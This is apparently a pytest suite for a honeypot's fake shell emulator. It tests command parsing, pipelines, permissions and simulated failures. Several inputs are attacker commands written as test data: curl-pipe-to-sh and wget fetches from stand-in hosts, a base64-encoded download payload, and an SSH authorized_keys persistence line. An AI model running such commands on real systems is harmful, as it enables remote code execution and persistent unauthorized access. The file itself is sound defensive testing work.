import base64

import pytest

from honeypot.fake_shell import FakeShell, parse_redirections, split_command_line, tokenize


@pytest.fixture()
def sh():
    return FakeShell("root", "box", "203.0.113.5")


def out(shell: FakeShell, line: str) -> str:
    return shell.run_line(line)[0]


# ----------------------------------------------------------------- parsing
def test_split_respects_quotes():
    assert split_command_line("echo 'a;b' && ls; pwd") == ["echo 'a;b'", "ls", "pwd"]


def test_tokenize_quotes_and_expansion():
    env = {"HOME": "/root"}
    # like bash: an unset unquoted variable produces no word, a quoted empty string does
    assert tokenize("echo '$HOME' \"$HOME\" $HOME $NOPE '' x", env) == ["echo", "$HOME", "/root", "/root", "", "x"]
    assert tokenize("awk '{print $NF}'", env) == ["awk", "{print $NF}"]
    assert tokenize("cat ~/.bashrc", env, home="/root") == ["cat", "/root/.bashrc"]
    assert tokenize("echo 'unbalanced") == ["echo", "unbalanced"]  # never raises


def test_parse_redirections():
    # (clean_tokens, stdout_target, append, drop_stderr)
    assert parse_redirections(["cat", "f", "2>/dev/null"]) == (["cat", "f"], None, False, True)
    assert parse_redirections(["echo", "x", ">>", "out"]) == (["echo", "x"], "out", True, False)
    assert parse_redirections(["cmd", "2>&1", "&"]) == (["cmd"], None, False, False)
    assert parse_redirections(["echo", "x", ">file"]) == (["echo", "x"], "file", False, False)
    assert parse_redirections(["cmd", "&>/dev/null"]) == (["cmd"], "/dev/null", False, True)


# ------------------------------------------------------------------- basics
def test_identity_and_navigation(sh):
    assert out(sh, "whoami") == "root\n"
    assert out(sh, "pwd") == "/root\n"
    sh.run_line("cd /tmp")
    assert sh.cwd == "/tmp" and sh.prompt == "root@box:/tmp# "
    assert "No such file" in out(sh, "cd /nope")


def test_unknown_command(sh):
    text, known = sh.run_line("nmap -sS 10.0.0.0/8")
    assert text == "-bash: nmap: command not found\n" and known is False


def test_virtual_fs_write_read_and_list(sh):
    sh.run_line("echo hello > /tmp/a.txt")
    sh.run_line("echo world >> /tmp/a.txt")
    assert out(sh, "cat /tmp/a.txt") == "hello\nworld\n"
    assert "a.txt" in out(sh, "ls /tmp")
    sh.run_line("rm /tmp/a.txt")
    assert "No such file" in out(sh, "cat /tmp/a.txt")


def test_authorized_keys_persistence_attempt(sh):
    sh.run_line("echo 'ssh-rsa AAAA attacker' >> ~/.ssh/authorized_keys")
    assert "attacker" in out(sh, "cat /root/.ssh/authorized_keys")


def test_non_root_restrictions():
    user = FakeShell("ubuntu", "box", "1.2.3.4")
    assert "Permission denied" in out(user, "cat /etc/shadow")
    assert user.prompt.endswith("$ ")


# --------------------------------------------------------------- pipelines
def test_cpu_fingerprint_pipeline(sh):
    assert out(sh, "cat /proc/cpuinfo | grep name | wc -l") == "4\n"


def test_pipeline_filters(sh):
    assert out(sh, "cat /etc/passwd | head -n 1") == "root:x:0:0:root:/root:/bin/bash\n"
    assert out(sh, "cat /etc/passwd | tail -1 | cut -d: -f1") == "ubuntu\n"
    assert out(sh, "free -m | grep Mem | awk '{print $2}'") == "7957\n"
    assert out(sh, "grep -c root /etc/passwd") == "1\n"
    assert out(sh, "echo b a | tr ' ' '\\n'") in ("b\na\n", "b a\n")  # tr is best-effort
    assert out(sh, "printf 'a\\nb\\na\\n' | sort | uniq -c") == "      2 a\n      1 b\n"


def test_stderr_redirects_do_not_become_filenames(sh):
    assert out(sh, "cat /proc/version 2>/dev/null").startswith("Linux version")


def test_echo_escapes(sh):
    assert out(sh, "echo -e 'a\\tb\\x41'") == "a\tbA\n"
    assert out(sh, "echo -n hi") == "hi"


# ---------------------------------------------------------------- safety
def test_downloads_are_always_simulated_failures(sh):
    assert "unable to resolve host" in out(sh, "wget http://evil.example/bot")
    assert "Could not resolve host" in out(sh, "curl http://evil.example/bot")
    assert out(sh, "curl -s http://evil.example/bot") == ""  # -s is silent, like real curl
    assert out(sh, "wget -q http://evil.example/bot 2>/dev/null") == ""


def test_stderr_is_not_piped(sh):
    # real bash: curl's error goes to the terminal, sh receives empty stdin
    assert out(sh, "curl -sS http://evil.example/x.sh | sh") == "curl: (6) Could not resolve host: evil.example\n"
    assert out(sh, "nope | wc -l") == "-bash: nope: command not found\n0\n"


def test_base64_payload_is_decoded_executed_in_emulator_and_exposed(sh):
    encoded = base64.b64encode(b"wget http://198.51.100.9/x").decode()
    text = out(sh, f"echo {encoded} | base64 -d | sh")
    assert "unable to resolve host" in text  # the decoded command ran in the emulator only
    assert sh.take_payloads() == ["wget http://198.51.100.9/x"]
    assert sh.take_payloads() == []  # drained


def test_nesting_is_bounded(sh):
    sh.run_line("sudo " * 500 + "id")  # must not raise RecursionError


def test_busybox_probe(sh):
    assert out(sh, "/bin/busybox ECCHI") == "ECCHI: applet not found\n"


def test_exit(sh):
    sh.run_line("exit")
    assert sh.exit_requested
